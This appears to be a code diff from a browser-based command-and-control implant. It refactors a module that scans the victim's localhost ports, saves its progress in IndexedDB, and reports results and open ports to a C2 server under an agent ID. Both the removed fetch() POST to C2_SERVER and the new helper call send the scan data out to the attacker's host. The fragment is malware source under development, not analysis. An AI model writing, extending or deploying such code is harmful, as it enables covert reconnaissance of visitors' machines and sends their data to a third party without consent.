@@ -1,10 +1,6 @@
 function sendLocalhostResultToC2(data){
-  fetch(C2_SERVER + '/module/localhost_port_scan/' + agentID, {
-    body: data,
-    method: 'POST'
-  });
+  sendModuleResultToC2('localhost_port_scan', data);
 }
-
 
 function sendLocalhostOpenPortToC2(p){
   data = new FormData();
@@ -41,7 +37,7 @@ var localPortScanPort;
 // wakes up the DB
 WriteIDB("localhost_port_scan_init", 1);
 // save module in list of extra_modules
-registerModule('localhost_port_scan', null);
+registerModule('localhost_port_scan');
 // check what last port scanned and resume
 new Promise((res, rej) => {
   ReadIDB("localhost_port_scan", rej);
